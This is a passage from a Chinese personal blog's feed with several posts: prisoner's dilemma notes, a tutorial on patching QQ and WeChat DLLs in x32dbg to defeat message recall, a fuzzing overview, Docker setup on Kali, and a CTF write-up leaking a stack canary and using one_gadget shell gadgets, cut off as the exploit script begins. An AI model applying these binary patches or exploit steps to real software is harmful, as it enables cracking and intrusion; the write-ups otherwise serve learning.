这场博弈中唯一可能达到的纳什均衡，就是双方参与者都背叛对方，结果二人同样服刑8年。</p><p>（2）从团体角度来看，如果两个参与者都合作保持沉默，两人都只会被判刑一年，总体利益更高，结果也比两人背叛对方、判刑8年的情况较佳。但根据以上假设，二人均为理性的个人，且只追求自己个人利益。均衡状况会是两个囚徒都选择背叛，结果二人判决均比合作为高，总体利益较合作为低。这就是“困境”所在。例子漂亮地证明了：非零和博弈中，<a href="https://wiki.mbalib.com/wiki/%E5%B8%95%E7%B4%AF%E6%89%98%E6%9C%80%E4%BC%98" target="_blank" rel="noopener">帕累托最优</a>和<a href="https://wiki.mbalib.com/wiki/%E7%BA%B3%E4%BB%80%E5%9D%87%E8%A1%A1" target="_blank" rel="noopener">纳什均衡</a>是相冲突的。</p><hr><h3 id="思维实验1-1"><a href="#思维实验1-1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p><strong>当囚徒困境多次重复发生</strong></p><blockquote><p>单次发生的囚徒困境，和多次重复的囚徒困境结果不会一样。在重复的囚徒困境中，博弈被反复地进行。因而每个参与者都有机会去“惩罚”另一个参与者前一回合的不合作行为。这时，合作可能会作为均衡的结果出现。欺骗的动机这时可能被受到惩罚的威胁所克服，从而可能导向一个较好的、合作的结果。作为反复接近无限的数量，纳什均衡趋向于帕累托最优。</p></blockquote><hr><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>囚徒困境主旨</strong></p><blockquote><p>囚徒困境的主旨为，囚徒们虽然彼此合作，坚决不坦白，可为全体带来最佳利益（累计和最少刑期），但在资讯不明的情况下，因为出卖同伙可为自己带来利益（缩短刑期）。同伙坦白可为他带来利益，因此彼此出卖虽违反最佳共同利益，反而是自己最大利益所在。但实际上，执法机构不可能设立如此情境来诱使所有囚徒招供，因为囚徒们必须考虑刑期以外之因素（出卖同伙会受到报复等），而无法完全以执法者所设立之利益（刑期）作考量。</p></blockquote><p><strong>囚徒困境的应用</strong></p><blockquote><p>许多行业的价格竞争都是典型的囚徒困境现象，每家企业都以对方为敌手，只关心自己的利益。在价格博弈中，只要以对方为敌手，那么不管对方的决策怎样，自己总是以为采取低价策略会占便宜，这就促使双方都采取低价策略。如可口可乐公司和百事可乐公司之间的竞争、各大航空公司之间的价格竞争等等。</p></blockquote><blockquote><p>在国内的家电大战中，虽然不是两个对手之间的博弈，但由于在众多对手当中每一方的市场份额都很大，每一个主体人的行为后果受对手行为的影响都很大，因此，其情景大概也是如此。如果清楚这种前景，双方勾结或合作起来，都制定比较高的价格，那么双方都可以因为避免价格大战而获得较高的利润。但是往往这些联盟处于利益驱动的“囚徒困境”，双赢也就成泡影。五花八门的价格联盟总是非常短命，道理就在这里。</p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 博弈论 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 三姬分金 </tag>
            
            <tag> 囚徒困境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>授人以鱼不如授人以渔 | QQ、微信防撤回详解</title>
      <link href="/2020/04/03/revoke/"/>
      <url>/2020/04/03/revoke/</url>
      
        <content type="html"><![CDATA[<blockquote><p>前言：哦吼？暗恋的女生/男生发消息又撤回了？表白没看到怎么办？！今天整理一下PC端QQ、微信防撤回的具体步骤，自己修改dll文件，再也不用担心网络上的dll被植入后门啦！<br>P.S. 本教程理论上适合目前更新的所有版本QQ/Wechat，但手法有些粗糙。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/2020040310205548.jpg" alt=""></p><h2 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h2><ol><li>x32dbg</li><li>PC端Wechat/QQ<h2 id="QQ防撤回"><a href="#QQ防撤回" class="headerlink" title="QQ防撤回"></a>QQ防撤回</h2><h3 id="QQ版本"><a href="#QQ版本" class="headerlink" title="QQ版本"></a>QQ版本</h3><img src="https://img-blog.csdnimg.cn/20200403102452473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="QQ9.2.3"><h3 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h3>1.<strong>运行QQ，打开x32dbg，附加到进程QQ.exe</strong><br><img src="https://img-blog.csdnimg.cn/20200403103639294.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="附加程序"><br>2.<strong>在符号面板搜索im.dll，来到im.dll模块（该模块是负责QQ个人消息和群消息接收的模块）</strong><br><img src="https://img-blog.csdnimg.cn/20200403103808379.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索im.dll"><br><img src="https://img-blog.csdnimg.cn/20200403104650553.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="im.dll模块界面"><br>3.<strong>搜索关键字符串：bytes_reserved 和 bytes_userdef</strong><br>“bytes_reserved”字符串负责个人信息的撤回，“bytes_userdef”字符串负责群消息的撤回。<br><img src="https://img-blog.csdnimg.cn/2020040310483365.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://img-blog.csdnimg.cn/20200403104916254.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索bytes_reserved字符串"><br>双击进入第三个字符串，在入口的上一条地址处，修改汇编指令，让其直接到达test eax,eax命令处，这样就避免了消息的撤回。<br><img src="https://img-blog.csdnimg.cn/20200403105030615.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="注意是修改push ecx"><br><img src="https://img-blog.csdnimg.cn/20200403105137382.jpg#pic_center" alt="修改完成"><br><img src="https://img-blog.csdnimg.cn/2020040310520227.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索bytes_userdef字符串"><br><img src="https://img-blog.csdnimg.cn/20200403105236880.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="bytes_userdef界面"><br><img src="https://img-blog.csdnimg.cn/20200403105352664.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="修改push指令为jmp"><br>注意，此处是直接从push im.7A9D7C68处跳转到 test eax,eax<br><img src="https://img-blog.csdnimg.cn/20200403105520279.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="完成修改"><ol start="4"><li><strong>保存补丁并导出IM.dll文件进行替换</strong><br><img src="https://img-blog.csdnimg.cn/20200403105714928.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="生成补丁"><br><img src="https://img-blog.csdnimg.cn/20200403105738387.jpg#pic_center" alt="导出为IM.dll"></li><li><strong>成果图</strong><br><img src="https://img-blog.csdnimg.cn/20200403110152765.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="防撤回成功"><h3 id="过程总结"><a href="#过程总结" class="headerlink" title="过程总结"></a>过程总结</h3>QQ消息撤回的机制并没有进行很好的防御，主要原因在于已经接受到的消息，是储存在本地的，而消息撤回，则是调用函数从本地撤回，只要阻止这个机制就能实现消息的防撤回。由于时间原因，过程中的部分函数的原理没有深究，准备后期再来分析一下，要是能做出一个一体化的exe文件就更好了。总体来说，这个防撤回做的还是很有意思，在过程中能学到很多东西。<h2 id="微信防撤回"><a href="#微信防撤回" class="headerlink" title="微信防撤回"></a>微信防撤回</h2><h3 id="微信版本"><a href="#微信版本" class="headerlink" title="微信版本"></a>微信版本</h3><img src="https://img-blog.csdnimg.cn/20200403110313354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="微信 2.8.0.121"><h3 id="破解过程-1"><a href="#破解过程-1" class="headerlink" title="破解过程"></a>破解过程</h3></li><li><strong>启动微信，打开x32dbg，附加到微信进程。</strong><br>附加到wechat.exe后，在符号面板找到wechatwin.dll模块（该模块负责微信消息的撤回）<br><img src="https://img-blog.csdnimg.cn/20200403110537601.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="找到wechatwin.dll"></li><li><strong>在wechatwin.dll模块中寻找revokemsg字符串</strong><br><img src="https://img-blog.csdnimg.cn/20200403110823983.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="wechatwin.dll模块"><br>“revokemsg”出现次数可能较多，要选择在<strong>ChatMgr::RefreshUnReadCountByRevoke</strong>下面的第一个(L “&lt; revokemsg &gt;”不算)<br><img src="https://img-blog.csdnimg.cn/20200403110857557.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="搜索revoke，找到revokemsg字符串"></li><li><strong>点击跳转之后把当前位置下的第一个call指令nop掉</strong>（该call指令用于撤回消息）<br><img src="https://img-blog.csdnimg.cn/2020040311210256.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="nop 目标指令"><br><img src="https://img-blog.csdnimg.cn/20200403112143901.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="nop完成"></li><li><strong>保存补丁文件、导出WeChatWin.dll文件并替换原安装目录下的文件</strong><br><img src="https://img-blog.csdnimg.cn/20200403112300717.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="保存补丁"></li><li><strong>成果图</strong><br><img src="https://img-blog.csdnimg.cn/20200403112358499.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="破解成功"><h3 id="过程总结-1"><a href="#过程总结-1" class="headerlink" title="过程总结"></a>过程总结</h3>微信消息的撤回破解，重点还是在WechatWin.dll文件中，需要通过逆向找到dll文件中执行相关命令的函数，并nop掉（和上述QQ消息防撤回大同小异，一个是jmp跳转，一个是nop）。直接nop的手法还是显得有些粗糙。在查找资料的过程中，看到有些大佬是使用hook技术实现的消息防撤回机制，大感羡慕…在以后的学习过程中，想学习一些hook技术，在微信消息撤回时触发hook机制，以一个对话框的形式展示撤回内容。</li></ol></li></ol><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> crack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> QQ </tag>
            
            <tag> Wechat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞挖掘 | 简单高效的模糊测试Fuzzing</title>
      <link href="/2020/03/31/fuzzing/"/>
      <url>/2020/03/31/fuzzing/</url>
      
        <content type="html"><![CDATA[<blockquote><p>摘要：Fuzzing是一种通过构造输入来发现软件中的漏洞的一个简单高效的模糊测试方法。</p></blockquote><blockquote><p>前言：打CTF的时候就听说过几次fuzzing方法，大概知道是一种检测漏洞的方法，一直没了解过，今天抽个时间学习了一下。</p></blockquote><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>Fuzzing方法是指通过构造测试输入，对软件进行大量测试来发现软件中的漏洞的一种模糊测试方式。在现实的漏洞挖掘中，fuzzing因其简单高效的优势，成为非常主流的漏洞挖掘方法。</p><blockquote><p>模糊测试 （fuzz testing, fuzzing）是一种软件测试技术。其核心思想是将自动或半自动生成的随机数据输入到一个程序中，并监视程序异常，如崩溃，断言（assertion）失败，以发现可能的程序错误，比如内存泄漏。模糊测试常常用于检测软件或计算机系统的安全漏洞。<br>——来自Wikipedia</p></blockquote><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>模糊测试通常被用于<strong>黑盒测试</strong>。其回报率通常比较高。当然，模糊测试只是相当于对系统的行为做了一个随机采样，所以在许多情况下通过了模糊测试只是说明软件可以处理异常以避免崩溃，而不能说明该软件的行为完全正确。这表明模糊测试更多是一种对整体质量的保证，并不能替代全面的测试或者形式化方法。作为一种粗略的可靠性度量方法，模糊测试可以提示程序哪些部件需要特殊的注意。对于这些部件可以进一步使用代码审计，静态分析以及代码重写。</p><h2 id="技术"><a href="#技术" class="headerlink" title="技术"></a>技术</h2><p>模糊测试工具通常可以被分为两类。<strong>变异测试</strong>通过改变已有的数据样本去生成测试数据。<strong>生成测试</strong>则通过对程序输入的建模来生成新的测试数据。</p><p>最简单的模糊测试是通过命令行，网络包或者事件向一个程序输入一段随机比特流。这种技术当前依然是有效的发现程序错误的方法。另一个常见且易于实现的技术是通过随机反转一些比特或者整体移动一些数据块来变异已有的输入数据。但是，最有效的模糊测试需要能够理解被测试对象的格式或者协议。这可以通过阅读设计规格来实现。基于设计规格的模糊工具包含完整的规格，并通过基于模型的测试生成方法去遍历规格，并在数据内容，结构，消息，序列中引入一些异常。这种“聪明的”模糊测试也被称作<strong>健壮性测试，句法测试，语法测试以及错误注入</strong>。这种协议感知的特性也可以启发式的从例子中生成。相关的工具有Sequitur。</p><p>模糊测试也可以与其他技术结合。白盒模糊测试结合了符号执行技术与约束求解技术。演化模糊测试则利用了一个启发的反馈来有效的实现自动的探索性测试。</p><h2 id="详细说明"><a href="#详细说明" class="headerlink" title="详细说明"></a>详细说明</h2><h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="https://img-blog.csdnimg.cn/20200331225732678.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="Fuzzing基本流程"></p><h3 id="1-大量的测试用例"><a href="#1-大量的测试用例" class="headerlink" title="1.大量的测试用例"></a>1.大量的测试用例</h3><p>进行模糊测试的首要条件就是需要大量的测试用例（即种子输入），例如Charlie Miller对Reader 9.2.0进行的fuzzing测试，他首先从网上的1515个文件变异得到3036000个测试用例进行测试，最后得到crash。在对Preview这个软件做测试时，用了大概2790000个测试用例进行测试才得以拿到crash。这些数字跟我们的直观感受就是我们需要获得大量的测试用例，才能保证模糊测试过程中拿到程序的crash。</p><h3 id="2-对测试用例做过滤"><a href="#2-对测试用例做过滤" class="headerlink" title="2.对测试用例做过滤"></a>2.对测试用例做过滤</h3><p>实际情况中，并不是说拿很多的测试用例就可以去测试软件就可以拿到漏洞，即fuzzing测试并不是简单的关于生成测试用例去做测试的故事，而是一个关于怎么对测试用例做过滤的故事。并不是说得到几十万量级的测试用例之后，就可以拿到漏洞了，而实际上，这几十万个测试用例都是精品，用这些精品进行测试才得以发现的漏洞，那么怎么把这些精品过滤出来，这才是关键，也是我们在进行fuzzing测试过程中需要做的第二件重要的准备工作。</p><p>比如Charlie Miller在测试PDF的时候，他把网上所有能够下载到的80000个PDF文档都下载下来，然后找到一个最小的子集，这个子集的代码覆盖率和全集的代码覆盖率是一样的，这个最小的子集也就是软件测试中的最初始的集合—1515个文件，在这个最初始的集合上再去做fuzz，这就是一个筛选的过程，我们可以用代码覆盖率作为衡量标准，当然也可以选择其他合适的标准来完成这一筛选过程。</p><h3 id="3-要用正确的方法"><a href="#3-要用正确的方法" class="headerlink" title="3.要用正确的方法"></a>3.要用正确的方法</h3><p>Laurent Gaffié说过，他在研究SMB协议的远程调用接口的时候，最先做了很多工作，结果都失败了，直到他将策略改变成了用单字节的网络数据包，才有了大量的产量。所以fuzzing是要讲方法的，要想清楚可能出问题的是什么地方，你要用什么样的方法去把这个东西找出来，关于方法，每年都有很多的论文，大家可以去看。</p><p>Charlie Miller也说，很多关于fuzzing的报告都是讲述如何成功，但是现实中的fuzzing大部分都是讲关于失败的。可见在现实中做fuzz测试的时候，你会遇到很多挫折。所以找到正确的方法非常重要！CharlieMiller和Laurent Gaffié给出的代码虽然看起来很不起眼，但一旦找到了正确的方法，得到的结果往往很令人惊喜。</p><h3 id="4-花90-时间阅读文档"><a href="#4-花90-时间阅读文档" class="headerlink" title="4.花90%时间阅读文档"></a>4.花90%时间阅读文档</h3><p>还有一个问题，就是做fuzzing的人，并不是简单的写几行代码，对着软件一通测试就会出来结果。在做fuzzing之前，会有很多的时间是花在阅读文档上的。</p><p>对于复杂的程序，我们要去分析这个程序的功能是什么，它可能出问题的地方在什么位置，会有大量的几乎90%的时间是花在这上面的，这是Charlie Miller和Laurent Gaffié的一个评估。</p><h3 id="5-Fuzzing工具"><a href="#5-Fuzzing工具" class="headerlink" title="5.Fuzzing工具"></a>5.Fuzzing工具</h3><p>AFL，它是目前最受欢迎的一个工具，是一个导向型的fuzzing工具。 Fuzzing通常由盲fuzzing（blind fuzzing）和导向性fuzzing（guided fuzzing）两种。blind fuzzing生成测试数据的时候不考虑数据的质量，通过大量测试数据来概率性地触发漏洞。Guided fuzzing则关注测试数据的质量，期望生成更有效的测试数据来触发漏洞的概率。比如，通过测试覆盖率来衡量测试输入的质量，希望生成有更高测试覆盖率的数据，从而提升触发漏洞的概率。</p><p>AFL这个工具出来的一个起因就是AFL的开发者认为盲fuzzing的效率是比较低的；第二个原因就是Charlie Miller和Laurent Gaffié所做的样本筛选的方法是有效果的；还有第三个原因就是符号执行，符号执行在理论是非常不错的，但在实际中经常受到可行性、性能等方面的限制。于是在这样一个背景下，AFL出现了。</p><p>AFL有两个关键词：指令插桩和边覆盖。首先AFL是基于插桩的，能够辅助程序分析；其次AFL是基于边覆盖的，是对Charlie Miller等人基于块覆盖用样本筛选的一个改进和提升。<br>参考：<br><a href="https://zh.wikipedia.org/wiki/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95" target="_blank" rel="noopener">1.模糊测试-维基百科</a><br><a href="https://www.freebuf.com/news/193602.html" target="_blank" rel="noopener">2.简单高效的模糊测试Fuzzing</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali linux下docker与docker-compose的安装及两者差异</title>
      <link href="/2020/03/27/kali-docker/"/>
      <url>/2020/03/27/kali-docker/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近接了一个漏洞环境搭建的活，需要用到docker和docker-compose。因为物理机是Win10的，安装docker需要开启Hyper-V，但是Hyper-V和Vmware冲突。所以就在kali虚拟机里面搭了docker。下面记录一下搭建过程。</p><h2 id="安装docker："><a href="#安装docker：" class="headerlink" title="安装docker："></a>安装docker：</h2><pre><code>step1.apt-get updateapt-get install -y apt-transport-https ca-certificatesapt-get install dirmngrstep2.apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609Dstep3.echo 'deb https://apt.dockerproject.org/repo debian-stretch main' &gt; /etc/apt/sources.list.d/docker.liststep4.apt-get updatess-local -c /etc/shadowsocks.json (起飞机)proxychains4 apt-get install docker-engine 代理下载</code></pre><p><img src="https://img-blog.csdnimg.cn/20200327005202102.jpg" alt="docker 搭建成功"></p><h2 id="安装docker-compose"><a href="#安装docker-compose" class="headerlink" title="安装docker-compose"></a>安装docker-compose</h2><pre><code>ss-local -c /etc/shadowsocks.jsonproxychains4 curl -L https://github.com/docker/compose/releases/download/1.25.0-rc1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</code></pre><h2 id="docker和docker-compose的对比"><a href="#docker和docker-compose的对比" class="headerlink" title="docker和docker-compose的对比"></a>docker和docker-compose的对比</h2><p><strong>介绍</strong></p><blockquote><p>docker是一个供开发和运维人员开发，测试，部署和运行应用的容器平台。<br>compose是一个用于运行和管理多个容器化应用的工具。</p></blockquote><p><strong>对比</strong></p><ul><li>docker是自动化构建镜像，并启动镜像。 docker compose是自动化编排容器。</li><li>docker是基于Dockerfile得到images,启动的时候是一个单独的container</li><li>docker-compose是基于docker-compose.yml,通常启动的时候是一个服务，这个服务通常由多个container共同组成，并且端口，配置等由docker-compose定义好。</li><li>两者都需要安装，但是要使用docker-compose，必须已经安装docker</li></ul><p>参考博客：<br><a href="https://blog.51cto.com/11834557/2309885" target="_blank" rel="noopener">Linux下docker安装</a><br><a href="https://blog.csdn.net/hero_hope/article/details/91168836" target="_blank" rel="noopener">Linux下docker-compose安装</a><br><a href="https://www.jianshu.com/p/5794ec7e603b" target="_blank" rel="noopener">docker与docker-compose介绍，对比与使用</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>one_gadget用法|攻防世界pwn进阶区babystack</title>
      <link href="/2020/03/25/babystack/"/>
      <url>/2020/03/25/babystack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-检查保护"><a href="#0x00-检查保护" class="headerlink" title="0x00.检查保护"></a>0x00.检查保护</h2><pre><code>devil@ubuntu:~/adworld/pwn$ checksec babystack[*] '/home/devil/adworld/pwn/babystack'    Arch:     amd64-64-little    RELRO:    Full RELRO ;无法修改got表    Stack:    Canary found ;不能直接进行溢出    NX:       NX enabled ;堆栈不可执行    PIE:      No PIE (0x400000)</code></pre><h2 id="0x01-one-gadget"><a href="#0x01-one-gadget" class="headerlink" title="0x01.one_gadget"></a>0x01.one_gadget</h2><p>本题给了libc版本，可以使用<strong>one_gadget</strong>工具<br>我也是第一次使用one_gadget，简单介绍一下：</p><blockquote><p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so<br><a href="https://github.com/david942j/one_gadget">官方文档点击此处</a></p></blockquote><pre><code>devil@ubuntu:~/adworld/pwn$ one_gadget libc-2.23.so0x45216 execve("/bin/sh", rsp+0x30, environ)constraints:  rax == NULL0x4526a execve("/bin/sh", rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf0274 execve("/bin/sh", rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1117 execve("/bin/sh", rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</code></pre><p>通过使用one_gadget可以找到获得shell的函数的地址</p><pre class="line-numbers language-yaml"><code class="language-yaml">execve_addr = 0x45216<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x02-ida调试"><a href="#0x02-ida调试" class="headerlink" title="0x02.ida调试"></a>0x02.ida调试</h2><p><img src="https://img-blog.csdnimg.cn/20200325005840582.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="ida调试确定输入和canary距离"><br>可以看出v6储存的是canary，s是我们输入的字符串，二者相距0x88字节。<br>则我们先输入0x88个字节，再利用print函数就可以把canary的值带出来。<br><strong>代码如下：</strong></p><pre class="line-numbers language-python"><code class="language-python">payload1 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有了canary的值我们可以进行溢出，64位程序溢出还需要一个<code>pop rdi;ret</code><br><img src="https://img-blog.csdnimg.cn/20200325005956650.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70" alt="ROPgadget"></p><pre><code>0x0000000000400a93 : pop rdi ; ret</code></pre><h2 id="0x03-解题思路："><a href="#0x03-解题思路：" class="headerlink" title="0x03.解题思路："></a>0x03.解题思路：</h2><p>用’a’<em>0x88字节带出canary，知道canary即可进行溢出。<br>溢出利用puts函数输出puts的函数地址，再利用<code>puts_addr-libc.symbols['puts']</code>得到libc偏移offset<br><em>*execve_addr=offset+one_gadget得到的execve代码</em></em></p><h2 id="0x04-exp"><a href="#0x04-exp" class="headerlink" title="0x04.exp"></a>0x04.exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token 